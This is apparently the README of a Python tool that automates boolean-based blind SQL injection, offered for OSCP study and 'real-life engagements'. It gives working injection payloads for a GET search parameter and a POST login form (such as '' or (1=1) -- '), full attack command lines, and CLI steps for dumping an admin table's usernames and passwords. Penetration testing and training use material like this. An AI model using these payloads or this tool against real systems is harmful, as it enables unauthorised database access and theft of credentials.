# bsqli.py
A nifty little boolean-based SQLi script for OSCP and real-life engagements.


## Install ##

This script requires Python 3.10+, rich, and prompt_toolkit.

```shell
pip install rich prompt_toolkit
```

## Usage ##

1. Manually craft a Boolean-Based Blind SQLi PoC. The request should contain
   an SQLi payload with a condition (e.g. 1=1). There should be distinct
   responses between true and false responses, either in the status code or
   response body.

2. Separate the SQLi payload (e.g. `' or '1'='1`) from the GET/POST params,
   and replace it with `{payload}`. Move your payload to the `--payload`
   argument. We do this to easily differentiate the request and payload.

3. Separate the condition (e.g. 1=1, 1=0) from the SQLi payload, and replace
   it with `{cond}`. This will be substituted with URL-encoded SQLi
   conditions to be boolean-tested.

4. Instruct the script on how to distinguish between TRUE and FALSE
   responses. Use the -bts, -bfs, -bttc, -bftc flags to do this.

5. Optionally, if there is an error response (neither TRUE/FALSE), we can
   instruct the script to ignore the response (and consider as NULL or '?')
   using the -bes, -betc, and -betn flags.
   
   This is useful if the server sporadically returns 500 due to a forbidden
   character, an internal SQL error, or rate-limiting (in which case, turn
   down the number of threads).

6. To debug, turn on verbosity (-vv) to print the payload and conditions
   being tested.

   
## Interface ##

Upon entering the CLI, you have some options.

1. Run pre-baked commands.

   ```
   sqli> v
   sqli> u
   ```

    - v: version
    - u: curent user
    - d: db name
    - h: host name
    - s: server name

2. Query table. This is a special pre-baked command which allows you to
   enumerate a table and their columns. This hasn't been optimised for
   different versions yet (as some versions have special functions which can
   expedite this process).

   ```
   sqli> t
   table> information_schema.tables
   col> table_name
   ```

   This essentially does a `SELECT table_name FROM
   information_schema.tables`, but with some scripting involved to
   calculate, say number of entries.

   Here's another example which allows you to exfiltrate multiple columns on each row in MySQL.

   ```
   sqli> t
   table> admin
   col> concat(id,0x7c,username,0x7c,password,0x7c,firstname,0x7c,lastname,0x7c,created_on)
   ```

3. Run a custom query.

   ```
   sqli> SELECT 1
   sqli> SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='admin'
   ```

We impose some length restrictions (e.g. we cast to a VARCHAR(2048), so
extra characters may be chopped off). Play around with SQL SUBSTRING
functions to work around this.


## Examples ##

Here are some examples based on real-life engagements.

### Case 1: Exploiting an Injection Point in GET Parameters ###

Observations:

- Victim runs on MySQL. (--dbms MySQL)
- Server returns a 200 status with XML containing `404` if the SQLi is
  false. (-bftc 404)
- The server also returns 200 if the SQLi is true, so we can't distinguish
  based on status code.

Request:

```http
GET /find.php?search=%25'%20AND%20(1=1)%20AND'1%25'%3d'1 HTTP/1.1
Host: vulnerable.site


```

Command:

```shell
python bsqli.py \
    -u 'http://vulnerable.site/find.php?search={payload}' \
    -X GET \
    --payload $'%\' AND {cond} AND \'1%\'=\'1' \
    --dbms MySQL \
    -bftc 404
```

### Case 2: Exploiting an Injection Point in a POST Form ###

Observations:

- Victim runs on SQLServer (--dbms SQLServer)
- Injection is in POST data (-X POST --data ...)
- The server is pretty beefy and can handle a larger number of threads
  (-t 32)
- The server returns 302 if the SQLi is successful. (-bts 302)
  We'll use this to determine if a query resulted in TRUE/FALSE.
- The server returns 500 if an error occurred (e.g. forbidden character,
  SQL error). (-bes 500)
  We'll use this to catch and discard false positives.

Request:

```http
POST / HTTP/1.1
Host: vulnerable.site
Content-Length: ...
Content-Type: application/x-www-form-urlencoded

login=a&password='%20or%20(1=1)%20--%20
```

Command:

```shell
python bsqli.py \
    -u http://vulnerable.site/login.asp \
    -X POST \
    --data=$'login=a&password={payload}' \
    --payload=$'\' or {cond} -- ' \
    --dbms SQLServer \
    -t 32 \
    -bts 302 -bes 500
```
    
